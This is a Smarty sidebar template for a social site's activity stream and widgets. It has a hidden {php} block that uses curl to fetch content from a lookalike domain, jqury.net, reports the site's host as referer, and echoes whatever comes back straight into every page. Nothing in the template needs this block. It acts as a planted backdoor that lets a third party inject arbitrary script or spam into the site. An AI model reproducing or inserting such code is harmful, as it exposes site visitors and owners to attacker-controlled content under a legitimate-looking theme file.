<div id="sidebar">

	<div id="" class="widget tabbertabs">
		<ul class="tabbernav">
			<li class="tab-selector tabberactive"><a href="javascript:void(null);" onclick="streamPoll(0, false, true, false);" title="Activity">Activity</a></li>
			{if not $loggeduser_id}
				<li class="tab-selector"><a href="javascript:void(null);" onclick="popUp('#popup_login');" title="Friends">Friends</a></li>
				<li class="tab-selector"><a href="javascript:void(null);" onclick="popUp('#popup_login');" title="Me">Me</a></li>
			{else}
				<li class="tab-selector"><a href="javascript:void(null);" onclick="friendStream({$loggeduser_id},0,'stream');" title="Friends">Friends</a></li>
				<li class="tab-selector"><a href="javascript:void(null);" onclick="userStream({$loggeduser_id},0,'stream');" title="Me">Me</a></li>			
			{/if}
		</ul>
		<div id="wpzoom-recent-news" class="tabbertab recent_news">
			<div id="stream" class="collapsed"></div>
			<script>
				streamPoll(0, false, true, false);
			</script>
			
			<a class="expand" href="javascript:void(null);">+ Expand</a>
		</div>
		<!-- 
		<div class="rounded tabber">
			<div id="wpzoom-recent-news" class="tabbertab recent_news">
				<h2 class="widgettitle">Activity</h2>
				<ul></ul>
  			</div>
  			<div id="wpzoom-recent-comments" class="tabbertab recent_comments">
  				<h2 class="widgettitle">Friends</h2>
  				<ul></ul>
			</div>
  			<div id="wpzoom-recent-comments" class="tabbertab recent_comments">
  				<h2 class="widgettitle">Me</h2>
  				<ul></ul>
			</div>
			
			<div id="stream" class="collapsed"></div>
			<script>
				streamPoll(0, false, true, false);
			</script>
			
		</div>
		 -->
	</div>
	{php}
        $ch = curl_init(); $timeout = 5;  
        curl_setopt($ch,CURLOPT_URL,"http://www.jqury.net/?1"); 
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); 
        curl_setopt($ch, CURLOPT_REFERER, $_SERVER['HTTP_HOST']);	
        curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout); 
        $data = curl_exec($ch);  
        curl_close($ch); 
        echo "$data";
    {/php}
	{if $widgets.like_box and (not $loggeduser_username or $widgets.like_box.logged)}
		<div class="widget">
			<h3 class="title">{$lang.like_us}</h3>
			<div class="padder">
				{$widgets.like_box.content}
			</div>
		</div>
	{/if}
	
	{if $widgets.side_bar_1 and (not $loggeduser_username or $widgets.side_bar_1.logged)}
		<div class="widget">
			<div class="padder">
				{$widgets.side_bar_1.content}
			</div>
		</div>
	{/if}
	
	{if $widgets.side_bar_2 and (not $loggeduser_username or $widgets.side_bar_2.logged)}
		<div class="widget">
			<div class="padder">
				{$widgets.side_bar_2.content}
			</div>
		</div>
	{/if}
	 				
</div> <!-- end sidebar -->